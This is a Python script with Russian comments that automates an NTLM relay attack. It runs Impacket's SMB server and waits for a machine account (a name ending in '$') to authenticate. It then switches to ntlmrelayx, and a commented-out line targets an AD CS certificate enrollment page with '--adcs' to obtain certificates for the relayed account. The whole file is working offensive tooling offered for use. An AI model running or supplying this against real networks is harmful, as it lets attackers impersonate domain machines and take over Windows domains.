import subprocess
import re
import shlex
import signal
import time, sys
import argparse

SMBSERVER_PATH = "/usr/bin/impacket-smbserver"
NTLMRELAYX_PATH = "/usr/bin/impacket-ntlmrelayx"

SHARE_NAME = "SHARE"
SHARE_PATH = "./"
LOG_FILE = "./smbserver.log"

smbserver_process = None
ntlmrelayx_process = None


def start_smb_server(smb_cmd, ntlmx_cmd):
    """Запуск impacket-smbserver с выводом логов в реальном времени"""
    global smbserver_process
    #cmd = [SMBSERVER_PATH, SHARE_NAME, SHARE_PATH, "-smb2support"]
    print(f"[+] Запуск SMB Server: {' '.join(smb_cmd)}")

    smbserver_process = subprocess.Popen(
        smb_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

    while True:
        output = smbserver_process.stdout.readline()
        if output:
            print(f"[SMBSERVER] {output.strip()}")
            check_authentication(output, ntlmx_cmd)  # Проверяем аутентификацию
        if smbserver_process.poll() is not None:
            break


def stop_smb_server():
    """Остановка impacket-smbserver"""
    global smbserver_process
    if smbserver_process:
        print("[-] Остановка SMB Server...")
        smbserver_process.terminate()
        smbserver_process.wait()
        smbserver_process = None


def start_ntlmrelayx(ntlmx_cmd):
    """Запуск impacket-ntlmrelayx с выводом логов в реальном времени"""
    global ntlmrelayx_process
    #cmd = [NTLMRELAYX_PATH, "-smb2support", "-t","http://192.168.140.218/certsrv/certfnsh.asp", "--adcs", "--keep-relaying"]
    print(f"[+] Запуск NTLMRelayX: {' '.join(ntlmx_cmd)}")

    ntlmrelayx_process = subprocess.Popen(
        ntlmx_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

    while True:
        output = ntlmrelayx_process.stdout.readline()
        #if ('SUCCEED' in output) or ('Writing PKCS#12 certificate' in output):
        if output:
            print(f"[NTLMRELAYX] {output.strip()}")
        if ntlmrelayx_process.poll() is not None:
            break


def check_authentication(output, ntlmx_cmd):
    """Проверяет аутентификацию и ищет системных пользователей (заканчивающихся на '$')"""
    match = re.search(r"User\s+([\w\.\-\\\$]+)", output)
    if match:
        username = match.group(1)
        print(f"[!] Входящее соединение от: {username}")

        # Если имя пользователя заканчивается на $, переключаем на ntlmrelayx
        if username.endswith("$"):
            print("[!] Обнаружено системное соединение! Переключаемся на NTLMRelayX...")
            stop_smb_server()
            start_ntlmrelayx(ntlmx_cmd)
            sys.exit(0)  # Завершаем скрипт после переключения


def parse_arguments():
    parser = argparse.ArgumentParser(description='Запуск impacket-smbserver и impacket-ntlmrelayx')
    
    parser.add_argument('--smbserver-args', type=str, default='SHARE ./tmp',
                      help='Аргументы для impacket-smbserver в кавычках')
    parser.add_argument('--ntlmrelayx-args', type=str, default='',
                      help='Аргументы для impacket-ntlmrelayx в кавычках')
    
    return parser.parse_args()

def main():
    global smb_cmd
    global relay_cmd

    args = parse_arguments()
    
    smb_cmd = [SMBSERVER_PATH] + shlex.split(args.smbserver_args)
    relay_cmd = [NTLMRELAYX_PATH] + shlex.split(args.ntlmrelayx_args)

    try:
        start_smb_server(smb_cmd, relay_cmd)
    except KeyboardInterrupt:
        print("\n[!] Остановка по CTRL+C")
        stop_smb_server()
        sys.exit(0)

if __name__ == "__main__":
    main()
